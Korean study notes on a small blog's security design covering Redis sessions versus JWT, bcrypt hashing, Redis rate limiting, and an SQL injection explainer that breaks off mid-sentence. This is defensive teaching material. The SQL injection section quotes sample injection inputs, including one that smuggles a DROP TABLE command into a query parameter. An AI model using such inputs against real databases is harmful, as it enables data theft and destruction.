- `RottenNobleProject` `STUDY-01` — `DevelopPrompt/CurrentProject/_RottenNobleProject/Study.md`

## 정의

로그인 후 "이 사용자가 계속 로그인 상태다"라는 걸 서버가 매 요청마다 어떻게 확인할지 정하는 방식이
크게 두 갈래로 나뉜다. 하나는 서버가 발급한 토큰을 **서버 쪽 저장소에 보관**해두고 매번 그 저장소를
조회해서 확인하는 방식(세션 방식, 이 프로젝트가 Redis로 구현한 것)이고, 다른 하나는 토큰 **자체에
서명을 넣어서** 저장소 조회 없이 서명만 검증하면 되게 만드는 방식(JWT, JSON Web Token)이다.

## 요약

RottenNobleProject는 Redis 기반 세션을 골랐고, 그 덕분에 "로그아웃하면 그 즉시, 확실하게 무효화"가
가능하다 — JWT였다면 이게 기본으로는 안 되는, 이 프로젝트가 실제로 얻은 것과 포기한 것이 명확히
갈리는 지점이다.

## 상세

### 세션 방식 — "토큰은 열쇠, 진짜 정보는 서버 금고에"

이 프로젝트가 실제로 구현한 방식이다. `login.php`가 로그인에 성공하면 무작위 문자열(토큰)을
만들어 클라이언트에 준 다음, "이 토큰 = 관리자"라는 사실 자체는 서버 쪽 Redis에 저장해둔다.
토큰 자체에는 아무 정보도 없다 — 그냥 무작위 문자열일 뿐이고, 그 문자열이 의미를 가지려면 매번
Redis에 물어봐야 한다. 그래서 이 방식을 "opaque(불투명) 토큰"이라고도 부른다 — 토큰만 봐서는
아무것도 알 수 없기 때문이다.

```php
// login.php — 토큰 생성과 저장이 분리돼 있다
$token = bin2hex(random_bytes(32));      // 그냥 무작위 문자열
$redis->set("admin_session:$token", 'admin', 86400); // 의미는 여기(서버)에만 있다
```

### JWT 방식 — "토큰 안에 이미 정보와 서명이 들어있다"

JWT는 정반대 철학이다. 토큰 자체가 `헤더.페이로드.서명` 세 부분으로 이루어져 있고, 페이로드
안에 "누구인지, 언제 발급됐는지, 언제 만료되는지"(`exp` 클레임) 같은 정보가 그대로 들어있다.
서버는 이 토큰을 받으면, 저장소를 조회할 필요 없이 **서명만 검증**하면 된다 — 서명이 서버만 아는
비밀 키로 만들어졌다는 것만 확인하면, 토큰 안의 내용이 위조되지 않았다고 믿을 수 있다. 그래서
"stateless(무상태)" 인증이라고 부른다 — 서버가 어떤 세션도 기억하고 있을 필요가 없기 때문이다.

### 왜 이 프로젝트는 세션(Redis)을 골랐나

`CODE_MEMO.md`의 `MEMO-WEB-04`에 남아있는 이유는 단순하다 — **즉시, 확실한 무효화**가 필요했기
때문이다. 관리자가 로그아웃하면(`logout.php`), 서버는 Redis에서 그 토큰을 `DEL`로 바로 지워버릴
수 있다. 그 순간부터 그 토큰은 완전히 죽은 토큰이다.

JWT였다면 이게 훨씬 까다롭다. 서버가 서명만 검증하고 저장소를 안 본다는 게 JWT의 핵심 장점인데,
그 말은 곧 "이미 발급된 토큰을 강제로 무효화할 방법이 기본적으로 없다"는 뜻이기도 하다. 토큰이
만료 시각(`exp`)에 도달하기 전까지는, 서버가 "이 토큰은 이제 못 쓴다"고 선언할 저장소 자체가
없다. 이걸 해결하려면 결국 "무효화된 토큰 블록리스트"를 서버 쪽에 별도로 둬야 하는데, 그 순간
JWT의 "저장소 조회가 필요 없다"는 장점이 사실상 사라진다 — 블록리스트도 결국 매 요청마다 조회해야
할 저장소이기 때문이다.

이 프로젝트는 이미 `RottenNoble-HttpServer`/`TCPServer`와 Redis 인프라를 공유하고 있었다는 점도
컸다 — 세션 저장소로 쓸 Redis가 어차피 이미 있었으니, JWT가 주는 "저장소가 필요 없다"는 이점
자체가 이 프로젝트에는 크게 매력적이지 않았다.

### 실제 위험: 토큰이 새어나갔을 때

두 방식의 차이가 가장 극명하게 드러나는 시나리오는 "토큰이 유출됐다는 걸 방금 알았다"는 상황이다.

- **Redis 세션(이 프로젝트)**: 관리자가 `logout.php`를 호출하거나, 서버 운영자가 Redis에서 직접
  그 키를 지우면 그 즉시 끝난다. 유출된 토큰은 다음 요청부터 바로 401을 받는다.
- **JWT**: 만료 시각까지는 막을 방법이 없다(블록리스트를 미리 만들어두지 않았다면). 그래서 JWT를
  쓰는 실무 시스템들은 대개 만료 시간을 짧게(예: 15분) 잡고, 그 대신 "리프레시 토큰"이라는 별도
  토큰으로 짧은 토큰을 계속 재발급받는 2단계 구조를 쓴다 — 결국 리프레시 토큰 쪽은 서버가 상태를
  들고 있어야 해서, 완전히 무상태인 JWT는 실무에서 드물다.

## 비교표

| 항목 | Redis 세션 (이 프로젝트) | JWT |
|---|---|---|
| 토큰 자체에 정보가 있는가 | 없음(무작위 문자열) | 있음(페이로드가 그대로 담김) |
| 검증 방법 | 매 요청마다 서버 저장소(Redis) 조회 | 서명 검증만(저장소 조회 불필요) |
| 여러 서버에 걸친 검증 | 저장소를 공유하면 가능(이 프로젝트가 이렇게 함) | 비밀 키만 공유하면 저장소 없이 가능 |
| 즉시 무효화(로그아웃) | 기본 기능(`DEL` 한 번) | 기본으로는 불가능 — 블록리스트 별도 구현 필요 |
| 서버 확장성(수평 확장) | 세션 저장소가 병목이 될 수 있음 | 저장소 조회가 없어 이론상 더 유리 |
| 이 프로젝트가 실제로 얻은 것 | 즉시·확실한 로그아웃 | (선택 안 함) |
| 이 프로젝트가 포기한 것 | (해당 없음, 애초에 확장성이 중요하지 않은 규모) | (선택 안 함이므로 해당 없음) |

## 질문

- **Q. 이 프로젝트 규모(관리자 1명)에서 확장성 차이가 실제로 의미가 있었을까?**
  A. 거의 없다. JWT가 유리해지는 시나리오는 "인증 서버와 별개로 여러 API 서버가 각자 독립적으로
  토큰을 검증해야 하고, 그 서버 수가 늘어날 때"인데, 이 프로젝트는 관리자 한 명이 쓰는 개인
  블로그라 애초에 그런 확장이 일어날 일이 없다. 그래서 이 선택은 "확장성보다 즉시 무효화를
  우선했다"기보다, "확장성이 애초에 이 프로젝트에서 고려 대상이 아니었다"에 더 가깝다.

- **Q. 그럼 언제 JWT를 고르는 게 맞나?**
  A. 여러 독립된 서비스(마이크로서비스)가 같은 사용자를 인증해야 하는데, 그 서비스들이 매번
  하나의 중앙 세션 저장소에 물어보는 게 병목이 되는 상황. 혹은 인증 서버와 리소스 서버가 물리적으로
  분리돼 있어 세션 저장소를 공유하기 어려운 상황. 이런 경우엔 "일단 서명만 검증하고, 정말
  민감한 작업 전에만 추가 확인" 같은 절충이 JWT의 이점을 살릴 수 있다.

- **Q. "Redis 세션도 결국 저장소 조회가 필요하니 JWT의 무상태성만큼 빠르지 않다"는 말이 맞나?**
  A. 맞다. 다만 Redis 자체가 메모리 기반이라 그 조회 자체가 매우 빠르다([Redis](../Infrastructure/Redis.md) 참고).
  "저장소 조회가 없다"는 JWT의 이론적 이점이 실무에서 체감될 만큼 크려면, 그 저장소 조회가 실제
  병목이 될 정도의 트래픽 규모여야 한다 — 이 프로젝트는 그런 규모가 전혀 아니다.

## 예시 코드

```php
// 이 프로젝트: Redis 세션 검증 (backend/auth.php)
$value = $redis->get("admin_session:$token");
if ($value !== 'admin') {
    send_error('세션이 유효하지 않거나 만료되었습니다.', 401);
}
```

```text
// 참고: JWT였다면 이 검증이 이런 모양이 됐을 것이다 (이 프로젝트엔 없는 코드, 개념 설명용)
$payload = JWT::decode($token, $secretKey, ['HS256']);
if ($payload->exp < time()) {
    send_error('토큰이 만료되었습니다.', 401);
}
// Redis 조회가 아예 없다 — 대신 로그아웃을 강제할 방법도 여기 없다
```

## 플로우차트

로그인 이후 "무효화가 필요한 순간"에 두 방식이 어떻게 갈라지는지는 순서와 분기가 핵심이라
그림으로 남긴다.

→ [`JWT-vs-Redis-Session.flow.md`](./JWT-vs-Redis-Session.flow.md)

## 실무

실무에서는 두 방식 다 널리 쓰이고, "무조건 이게 낫다"는 정답은 없다 — 시스템의 형태에 따라 갈린다.
단일 서버나 소수의 서버가 하나의 세션 저장소(Redis 등)를 공유할 수 있는 구조라면 세션 방식이
여전히 흔하고, 특히 이 프로젝트처럼 "즉시 로그아웃"이 중요한 서비스(뱅킹, 관리자 페이지)에서
선호된다. 반대로 OAuth2/OIDC 기반의 대규모 마이크로서비스, 여러 회사의 서비스가 서로의 인증을
믿어야 하는 연합 인증(federated auth) 상황에서는 JWT(또는 그 사촌 격인 OAuth Access
Token)가 사실상 표준이다. 최근 동향으로는 "JWT를 쓰되 만료 시간을 짧게 잡고, 그 대신 서버 쪽에
상태를 갖는 리프레시 토큰을 따로 둔다"는 하이브리드 구조가 실무에서 가장 흔한 절충안이다 — 순수
무상태 JWT만 쓰는 경우는 생각보다 드물다.

# 비밀번호 해싱 (bcrypt)

---

- **카테고리**: 네트워크/보안, 웹 개발
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `RottenNobleProject-Architecture.md` 3회차(인증 흐름) 코드 학습에서
`login.php`의 `password_verify()` 호출을 보다가 분리한 주제.

## 정의

비밀번호 해싱은 사용자의 실제 비밀번호를 데이터베이스나 설정 파일에 그대로 저장하지 않고, **되돌릴
수 없는 변환(해시 함수)**을 거친 값만 저장하는 방법이다. 로그인 시에는 사용자가 입력한 비밀번호를
같은 방식으로 변환해서 저장된 해시와 비교한다 — 원래 비밀번호가 무엇이었는지는 그 해시값만 봐서는
알아낼 수 없다.

## 요약

이 프로젝트는 관리자 비밀번호를 평문이 아니라 bcrypt 해시로 저장하고, `password_verify()`로
검증한다 — 관리자가 한 명뿐인 아주 작은 시스템이지만, 이 부분만큼은 실무 표준을 그대로 따른
지점이다.

## 상세

### 왜 평문 저장이 안 되나

만약 비밀번호를 그대로 저장한다면, 설정 파일이나 DB가 유출되는 순간 모든 사용자의 실제 비밀번호가
그대로 노출된다. 이 프로젝트가 실제로 겪은 `MEMO-WEB-01`(DB 접속 정보가 평문으로 git에 커밋된 적
있음)과 같은 종류의 사고가 비밀번호에서 일어난다고 생각하면, 왜 이게 중요한지 바로 와닿는다.
해싱은 "유출되더라도 원래 비밀번호를 바로 알아낼 수는 없게" 만드는 마지막 방어선이다.

### 왜 단순 해시(SHA-256 등)로는 부족한가

"되돌릴 수 없는 변환"이라면 SHA-256 같은 일반 해시 함수를 써도 되지 않을까 싶을 수 있다. 문제는
속도다. SHA-256은 원래 "빠르게" 계산되도록 설계됐다 — 파일 무결성 검증 같은 용도에는 그게
장점이지만, 비밀번호에는 정반대로 작용한다. 공격자가 유출된 해시값을 놓고 "이 문자열들을 SHA-256에
넣어보면서 같은 해시가 나오는 걸 찾는" **무차별 대입(brute-force)** 공격을 할 때, 해시 계산이
빠를수록 공격자가 초당 시도할 수 있는 횟수가 늘어난다. 최신 GPU는 SHA-256을 초당 수십억 번씩
계산할 수 있다.

bcrypt는 의도적으로 계산이 느리도록 설계됐다(그리고 그 느린 정도를 "cost factor"로 조절할 수
있다). 정당한 로그인 시도 한 번에 몇 십~몇 백 밀리초가 걸리는 건 사용자 입장에서 체감이 안
되지만, 공격자가 수십억 개의 후보를 시도해야 하는 무차별 대입 공격에서는 이 속도 차이가 공격
시간을 현실적으로 불가능한 수준까지 늘려버린다.

### `salt`가 자동으로 처리된다는 것

같은 비밀번호를 쓰는 두 사용자가 있다면, 단순 해시는 정확히 같은 해시값을 만들어낸다 — 이러면
공격자가 "흔한 비밀번호의 해시값을 미리 계산해둔 표"(레인보우 테이블)로 여러 계정을 한꺼번에
공격할 수 있다. bcrypt는 해시를 계산할 때마다 무작위 "salt"(양념) 값을 섞어서, 같은 비밀번호라도
매번 다른 해시값이 나오게 만든다. PHP의 `password_hash()`는 이 salt를 자동으로 생성해서 해시값
안에 함께 저장해준다 — 개발자가 salt를 따로 관리할 필요가 없다.

```php
// config.example.php의 주석이 이미 알려주는 규칙
// password_hash('실제비밀번호', PASSWORD_BCRYPT)의 결과만 넣는다 — 평문 금지.
'admin_password_hash' => '',
```

```php
// login.php — 실제 검증 코드
$validPass = $password !== '' && password_verify($password, $config['admin_password_hash'] ?? '');
```

`password_verify($password, $hash)`는 내부적으로 `$hash`에 저장된 salt를 다시 꺼내 같은 방식으로
계산한 뒤 비교해준다 — 개발자는 salt를 신경 쓸 필요 없이 이 함수 하나만 쓰면 된다.

## 비교표

| 방식 | 되돌릴 수 없나 | 계산 속도(의도적으로) | Salt 자동 처리 | 이 프로젝트 사용 여부 |
|---|---|---|---|---|
| 평문 저장 | 아니오(그대로 노출) | - | - | 사용 안 함 |
| SHA-256 등 일반 해시 | 예 | 빠름(공격에 유리) | 직접 구현 필요 | 사용 안 함 |
| bcrypt (`password_hash`) | 예 | 느림(공격에 불리, 조절 가능) | 자동 | **사용 중** |
| Argon2 (`PASSWORD_ARGON2ID`) | 예 | 느림, 메모리도 많이 씀(더 강함) | 자동 | 사용 안 함(bcrypt로 충분한 규모) |

## 질문

- **Q. bcrypt 대신 Argon2를 쓰는 게 더 낫지 않나?**
  A. Argon2(특히 Argon2id)가 현재 시점에서는 더 최신이고, 메모리를 많이 요구하도록 설계돼 GPU
  기반 공격에 더 강하다는 평가를 받는다. 다만 bcrypt도 여전히 널리 쓰이고 검증된 방식이라, 관리자
  한 명만 로그인하는 이 프로젝트 규모에서는 실질적인 차이가 크지 않다. PHP는 `password_hash()`
  함수 하나로 두 방식을 알고리즘 상수만 바꿔서 전환할 수 있어(`PASSWORD_BCRYPT` ↔
  `PASSWORD_ARGON2ID`), 나중에 필요해지면 전환 비용이 크지 않다.

- **Q. 관리자가 한 명뿐인데 이렇게까지 신경 쓸 필요가 있었나?**
  A. 있다. 사용자 수와 별개로, 해싱을 제대로 안 하면 "DB나 설정 파일이 유출됐을 때의 피해 규모"가
  완전히 달라진다. 사용자가 한 명이어도 그 한 명의 비밀번호가 평문으로 노출되는 것과, bcrypt
  해시만 노출되는 것은 실질적 피해 차원이 다르다 — 이건 규모와 무관하게 항상 지켜야 하는 최소
  기준에 가깝다.

## 예시 코드

```php
// 비밀번호를 처음 설정할 때 (관리자가 직접 한 번 실행해서 해시를 만들고, 그 결과를
// config.local.php에 붙여넣는 방식 — 이 프로젝트엔 별도 "회원가입" 플로우가 없다)
echo password_hash('실제비밀번호', PASSWORD_BCRYPT);
// 출력 예: $2y$10$N9qo8uLOickgx2ZMRZoMy... (이 문자열 전체를 저장한다)
```

```php
// 로그인 시 검증
if (password_verify($inputPassword, $storedHash)) {
    // 일치
}
```

## 플로우차트

(생략 — "해시를 만들 때 한 번, 검증할 때 한 번, 함수 호출로 끝난다"는 흐름이라 그림이 필요한
분기나 순서가 없다.)

## 실무

`password_hash()`/`password_verify()`는 PHP 생태계에서 비밀번호를 다룰 때 사실상 표준이다 —
직접 해싱 알고리즘을 구현하거나 오래된 `md5()`/`sha1()`을 쓰는 코드를 실무에서 새로 작성하는
경우는 이제 거의 없다(있다면 레거시 코드 리뷰에서 바로 지적될 사안이다). 최근에는 bcrypt보다
Argon2id를 기본으로 권장하는 흐름이 있지만, 두 방식 모두 여전히 실무에서 널리 쓰이는 안전한
선택지다. 중요한 실무 원칙은 "직접 암호학 알고리즘을 설계하지 않는다"는 것 — 검증된 표준
함수만 쓴다.

## 같이 보기

  유지할지의 문제

# Rate Limiting — 요청 한 건이 허용/차단으로 갈리는 흐름

> `Rate-Limiting.md`의 별첨 플로우차트. 작성 규칙은
> `DevelopPrompt/Unity/VISUALIZE_RULE/04_MERMAID_STYLE.md`를 따른다.
> 기준 시점: 2026-09-08

```mermaid
flowchart TD
    REQ["요청 도착 (예: login.php)"] --> RC{"Redis 연결 가능?"}

    RC -->|"실패"| SKIP["제한 없이 통과"]:::hi
    SKIP --> HANDLER["원래 로직 실행"]:::good

    RC -->|"성공"| INCR["INCR rate_limit:{bucket}:{ip}"]
    INCR --> FIRST{"이번이 첫 요청?"}
    FIRST -->|"예"| EXPIRE["EXPIRE로 시간 창 설정"]
    EXPIRE --> CHECK
    FIRST -->|"아니오"| CHECK{"카운트 > 한도?"}

    CHECK -->|"아니오"| HANDLER
    CHECK -->|"예"| BLOCK["429 응답, 즉시 종료"]:::bad

    classDef bad  fill:#3a1f1f,stroke:#c0392b,color:#f5d5d5
    classDef good fill:#1f3a2a,stroke:#27ae60,color:#d5f5e3
    classDef hi   fill:#3a3320,stroke:#c19a5b,color:#f0e4c8
```

**읽는 법**: 왼쪽 갈래(`RC` → 실패 → `SKIP`)는 Redis 자체가 죽어있을 때의 경로다 — 이때는
제한을 아예 걸지 않고 원래 로직을 그대로 실행한다(주황 노드). 오른쪽 갈래가 정상 경로: `INCR`로
카운트를 올리고, 첫 요청이면 시간 창을 설정한 뒤, 한도를 넘었는지 확인해서 넘었으면 즉시 429로
끊고(빨강), 아니면 원래 로직으로 넘어간다(초록).

**핵심**: "Redis가 없으면 통과"와 "한도를 넘으면 차단"은 서로 다른 이유로 다른 결과를 낸다 —
전자는 가용성을 지키기 위한 의도적 완화(fail open)이고, 후자는 보안을 위한 의도적 차단
(fail closed)이다. 같은 함수 안에 두 가지 "실패 처리 철학"이 공존한다는 게 이 설계의 핵심이다.

# Rate Limiting — 같은 요청을 얼마나 자주 허용할지 정하기

---

- **카테고리**: 네트워크/보안, 웹 개발
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

2026-09-08, 실제 배포된 `rotten-noble.com`을 대상으로 스캔/프로빙 활동이 있었다(핑, 코드 구조
탐색, SQL 인젝션 시도). 인젝션은 기존 prepared statement 덕에 실패했지만, 로그인 엔드포인트에
요청 횟수 제한이 전혀 없어 무차별 대입이나 단순 DoS에는 그대로 열려 있다는 게 드러났다. 이 문서는
그 대응으로 `backend/lib/rate_limit.php`를 만들면서 정리한 것이다.

## 정의

Rate limiting은 "같은 클라이언트(보통 IP나 계정, 토큰 단위)가 정해진 시간 창 안에 특정 요청을
몇 번까지 보낼 수 있는지"를 서버가 직접 세어서 제한하는 기법이다. 인증(누구인지 확인)이나
인가(무엇을 할 수 있는지 확인)와는 다른 축이다 — 정당한 자격을 가진 사용자라도 "너무 자주"
요청하면 막는다는 점이 핵심이다.

## 요약

Rate limiting은 "이 요청이 유효한가"가 아니라 "이 요청이 너무 잦은가"를 본다. 카운터를 어디에
두느냐(메모리 vs 공유 저장소)와 어떤 알고리즘으로 세느냐(고정 창 vs 슬라이딩 윈도우 vs 토큰
버킷)에 따라 정확도와 구현 난이도가 갈린다.

## 상세

### 왜 인증만으로는 부족한가

로그인 엔드포인트(`login.php`)는 아이디/비밀번호가 틀리면 401을 반환한다 — 이건 인증 실패를
정확히 처리하는 것이지, "시도 횟수"를 세는 것과는 무관하다. 공격자는 초당 수백 번씩 비밀번호를
바꿔가며 요청을 보낼 수 있고, 서버는 매번 성실하게 "틀렸습니다"라고 답하며 CPU(`password_verify`는
의도적으로 느리게 설계된 bcrypt를 쓴다)와 네트워크 대역폭을 소모한다. 즉 인증 로직 자체는 이미
올바르게 동작하고 있어도, 그 앞에 "이 IP가 최근 몇 번 시도했는가"를 세는 계층이 없으면 서버가
공짜로 무차별 대입 공격 상대를 해주는 꼴이 된다.

### 카운터를 어디에 두나 — 메모리 vs Redis

PHP는 요청마다 새 프로세스(또는 요청 단위로 초기화되는 워커)로 실행되기 때문에, 일반 변수나
정적 배열에 카운터를 두면 다음 요청이 왔을 때 이미 사라지고 없다. 카운트가 요청 간에 살아남으려면
요청 밖의 공유 저장소가 필요하다 — `RottenNoble-Project`는 이미 관리자 세션에 Redis를 쓰고
있으므로([[jwt-vs-redis-session]] 참고) 같은 인스턴스를 그대로 재사용했다.

```php
// backend/lib/rate_limit.php
function rate_limit_check(string $bucket, int $maxRequests, int $windowSeconds): void
{
    $key = 'rate_limit:' . $bucket . ':' . client_ip();

    $redis = redis_connect();
    $count = $redis->incr($key);
    if ($count === 1) {
        $redis->expire($key, $windowSeconds);
    }

    if ($count > $maxRequests) {
        send_error('요청이 너무 많습니다. 잠시 후 다시 시도하세요.', 429);
    }
}
```

`INCR`은 Redis가 원자적으로 처리하는 명령이다 — "GET으로 현재 값을 읽고 +1해서 SET한다"를
애플리케이션 코드에서 직접 하면, 동시에 두 요청이 들어왔을 때 둘 다 같은 값을 읽고 둘 다 같은
값으로 SET해버리는 경쟁 상태(race condition)가 생긴다. `INCR`은 이 read-modify-write를 Redis
서버 안에서 한 번에 처리하므로 이 문제가 없다.

키가 새로 생긴 시점(`$count === 1`)에만 `EXPIRE`를 걸어 시간 창을 설정한다 — 이게 "고정 창(fixed
window)" 방식이다. 창이 시작된 시점부터 `$windowSeconds`가 지나면 Redis가 키를 자동으로 지워서
카운터가 0으로 리셋된다.

### 왜 Redis 연결 실패 시 그냥 통과시키나

```php
try {
    $redis = redis_connect();
    // ...
} catch (Throwable $e) {
    return; // 제한 없이 통과
}
```

이건 "실패를 무시하는 안일한 코드"처럼 보일 수 있지만 의도적인 선택이다. Redis가 잠깐
내려갔다고 해서 로그인이나 방명록 작성 자체가 막히면, rate limiting이라는 부가 기능이 핵심
기능의 가용성을 해치는 역설적인 상황이 된다. 보안 기능을 추가할 때는 "이 기능이 실패하면 무엇이
더 나쁜가"를 먼저 판단해야 한다 — 여기서는 "가끔 rate limit이 안 걸리는 것"이 "Redis 한 번 흔들릴
때마다 사이트가 로그인 불가 상태가 되는 것"보다 훨씬 낫다.

### 고정 창의 한계

고정 창 방식은 구현이 간단하지만 "창 경계에서의 버스트"에 약하다. 예를 들어 5분 창에 5회
제한이라면, 공격자가 4분 59초에 5번, 5분 1초(다음 창 시작 직후)에 또 5번을 보내면 사실상
10초 안에 10번을 통과시켜준 셈이다. 이보다 정교한 방식(슬라이딩 윈도우, 토큰 버킷)은 이 문제를
줄이지만 구현이 더 복잡하다 — 개인 포트폴리오 규모에서는 고정 창의 단순함과 이 정도 허점을
맞바꿀 만하다고 판단했다.

## 비교표

| 방식 | 정확도 | 구현 난이도 | 이 프로젝트의 선택 |
|---|---|---|---|
| 고정 창(fixed window) | 창 경계 버스트에 약함 | 낮음(INCR+EXPIRE 두 줄) | 사용 중 |
| 슬라이딩 윈도우(sliding window log) | 정확함 | 중간(타임스탬프 목록 관리 필요) | 미사용 |
| 토큰 버킷(token bucket) | 순간 버스트를 일부 허용하면서도 평균은 제한 | 중간~높음 | 미사용 |

## 질문

- **Q. IP 기반 제한이면 같은 공유기를 쓰는 여러 사용자가 서로 영향을 주지 않나?**
  A. 맞다 — 카페나 회사처럼 NAT 뒤에서 IP를 공유하는 환경이면, 한 명이 제한에 걸리면 같은
  공인 IP를 쓰는 다른 사람도 영향을 받는다. 로그인처럼 "계정"이 특정되는 요청은 IP와 계정 ID를
  같이 묶어 제한하면 이 문제를 줄일 수 있지만, `RottenNoble-Project`는 관리자가 1명뿐이라 계정
  단위로 나눌 실익이 없어 IP 단위로만 두었다.

- **Q. 진짜 분산 서비스 거부 공격(여러 IP에서 동시에)도 이걸로 막을 수 있나?**
  A. 아니다. IP당 제한은 "한 IP가 혼자 너무 자주 요청하는 것"만 막는다. 수백~수천 개의 서로 다른
  IP에서 동시에 소량씩 요청이 오면 각 IP는 제한에 안 걸리면서 서버 전체는 부하를 받을 수 있다.
  이건 애플리케이션 코드가 아니라 CDN/WAF(예: Cloudflare) 같은 앞단 인프라가 처리할 영역이다 —
  rate limiting과 WAF는 같은 문제의 다른 층을 담당한다.

## 예시 코드

```php
// login.php에 적용한 실제 위치 — CORS/메서드 검사 다음, 비밀번호 확인 전
allow_cors(['POST']);
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    send_error('POST만 허용됩니다.', 405);
}

rate_limit_check('login', 5, 300); // IP당 5분에 5회

$body = json_decode(file_get_contents('php://input'), true);
// ... 비밀번호 확인은 이 다음
```

성공/실패 여부와 무관하게 요청이 들어온 시점에 카운트한다 — "실패한 시도만 센다"고 하면
공격자가 항상 성공하는 요청(예: 이미 아는 계정으로 로그인)을 반복해서 다른 목적(DoS)으로
악용할 여지가 남기 때문이다.

## 플로우차트

`Rate-Limiting.flow.md` 참고 — 요청이 들어와서 허용/차단으로 갈리는 전체 흐름.

## 실무

실무에서는 애플리케이션 코드에 직접 rate limiting을 넣기보다, API 게이트웨이(Kong, AWS API
Gateway)나 리버스 프록시(Nginx `limit_req`, Cloudflare Rate Limiting) 계층에서 처리하는 경우가
많다 — 요청이 애플리케이션 서버(여기서는 PHP-FPM/Apache)에 도달하기도 전에 걸러낼 수 있어서
더 효율적이고, 여러 서비스에 동일한 정책을 일관되게 적용하기도 쉽다. `RottenNoble-Project`는
그런 앞단 인프라가 없는 개인 NAS 배포라 애플리케이션 레벨(PHP+Redis)에서 직접 구현했다 — 이후
Cloudflare 같은 프록시를 앞에 두게 되면, 거기서도 한 번 더 제한을 걸어 이중 방어선을 만드는 게
자연스러운 다음 단계다.

## (2026-09-09 갱신) Spring Boot 재작성에서도 이 방어만은 그대로 이어졌다

백엔드가 PHP에서 Spring Boot로 완전히 재작성되면서 CORS 허용목록([CORS.md](../Network/CORS.md))과
방명록 암호화([Encryption-at-Rest.md](./Encryption-at-Rest.md))는 실제 배포판에 반영되지 못했지만,
rate limiting만은 `@RateLimit` 어노테이션 + `RateLimitInterceptor`(Spring MVC 인터셉터) 형태로
다시 구현되어 로그인/방명록/게시글 쓰기에 그대로 적용됐고, **프로덕션에서 실제로 검증까지
됐다**(연속 로그인 시도 6번째부터 429 응답 확인). 같은 날 같이 손봤던 세 가지 방어(CORS/암호화/
rate limiting) 중 어느 것이 새 스택으로 넘어가고 어느 것이 유실될지는 미리 정해진 원칙이 있었던
게 아니라, 재작성 작업을 실제로 수행한 세션이 무엇을 우선순위로 챙겼는지에 달려 있었다는 걸
보여주는 사례다 — "언젠가 다른 스택으로 옮긴다"는 계획이 있다면, 옮겨야 할 보안 기능 목록을
명시적으로 체크리스트화해두지 않으면 이런 식으로 일부가 조용히 누락될 수 있다.

# SQL Injection — 쿼리에 데이터가 아니라 명령이 섞여 들어갈 때

---

- **카테고리**: 데이터베이스, 네트워크/보안
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

2026-09-08, 실제 배포된 `rotten-noble.com`을 대상으로 스캔/프로빙 활동이 있었고 그 안에 SQL
인젝션 시도가 포함돼 있었다(`Rate-Limiting.md`와 같은 사건). 같은 날 사용자가 시니어 백엔드
개발자에게 코드 리뷰를 받으면서 이 주제가 다시 짚였다 — RottenNobleProject의 직접 코드 학습
세션에서 나온 주제로, 별도 `STUDY-nn` 백로그 항목은 아니다.

## 정의

SQL 인젝션은 사용자가 입력한 값이 SQL 쿼리 문자열 안에 그대로 섞여 들어가서, 원래 의도한
"데이터"가 아니라 "명령의 일부"로 해석되게 만드는 공격이다. 서버가 사용자 입력을 데이터와 코드를
구분하지 못한 채 문자열을 이어붙여 쿼리를 만들면, 공격자는 그 문자열 조합 규칙을 역이용해 쿼리의
구조 자체를 바꿔버릴 수 있다.

## 요약

RottenNobleProject는 실제로 SQL 인젝션 시도를 받았지만 뚫리지 않았다 — PHP 시절부터 모든
DB 접근이 이어붙이기가 아니라 **준비된 문(prepared statement)**으로 되어 있었기 때문이다. 이번
Spring Boot 이관에서도 Spring Data JPA를 쓰면서 같은 안전성이 기본으로 유지된다. 이 문서는
"왜 준비된 문이면 막히는가"와 "그 방어가 새 스택에서도 정말 그대로 유지되는가"를 짚는다.

## 상세

### 왜 문자열 이어붙이기가 위험한가

가장 흔한 실수 패턴은 이런 모양이다(RottenNobleProject에는 없는, 설명을 위한 가상 코드):

```php
// 위험한 예시 — 이 프로젝트에는 이렇게 짠 곳이 없다
$id = $_GET['id'];
$sql = "SELECT * FROM posts WHERE id = " . $id;
$result = $conn->query($sql);
```

`id`가 `3`처럼 정상적인 숫자면 문제없이 동작한다. 하지만 공격자가 `id`에
`3 OR 1=1`을 넣으면 최종 쿼리는 `SELECT * FROM posts WHERE id = 3 OR 1=1`이 되고,
`1=1`은 항상 참이라 테이블의 모든 행이 조회된다. 더 나아가 `3; DROP TABLE posts;--` 같은
값을 넣으면(드라이버/DB 설정에 따라 다중 문장 실행이 허용되는 경우) 테이블 자체를 지워버리는
명령까지 실행될 수 있다. 핵심은 서버가 "이건 사용자가 준 값이다"와 "이건 내가 짠 쿼리 구조다"를
문자열 이어붙이기 시점에는 전혀 구분하지 못한다는 것이다.

### 준비된 문(prepared statement)이 막는 방식

RottenNobleProject의 PHP 코드는 처음부터 이렇게 짜여 있었다:

```php
// backend/get_post.php — 실제 이 프로젝트 코드
$stmt = $conn->prepare("SELECT id, title, content, created_at FROM posts WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

`?`는 값이 들어갈 자리를 미리 표시해두는 자리표시자(placeholder)다. `prepare()` 단계에서
DB 서버는 쿼리의 **구조**(어떤 테이블을, 어떤 조건으로)를 먼저 확정하고 실행 계획까지 세운다.
그 다음 `bind_param`으로 넘어가는 값은 그 확정된 구조 안의 "데이터"로만 취급되지, 쿼리 문자열에
다시 끼워 넣어져 재해석되는 게 아니다. `$id`에 `3 OR 1=1`이라는 문자열이 통째로 들어와도, DB는
그걸 "id 컬럼과 비교할 문자열 값"으로만 보지 새로운 쿼리 조건으로 보지 않는다 — 애초에 구조와
데이터가 서로 다른 채널로 전달되기 때문에 뒤섞일 방법이 없다.

### Spring Boot(JPA)에서는 왜 기본으로 안전한가

Spring Data JPA의 리포지토리 메서드는 내부적으로 Hibernate가 생성하는 파라미터 바인딩 쿼리를
쓴다:

```java
// backend-spring — PostRepository.java
List<Post> findAllByOrderByCreatedAtDesc();

// PostService.java에서
repository.findById(id) // id는 파라미터로 바인딩되지, 문자열로 이어붙여지지 않는다
```

메서드 이름을 분석해서 쿼리를 만드는 이 방식(Query Method)은 애초에 사용자가 SQL 문자열
자체에 손댈 여지를 주지 않는다 — 이어붙일 문자열 자체가 코드 어디에도 없다. 위험은 오히려
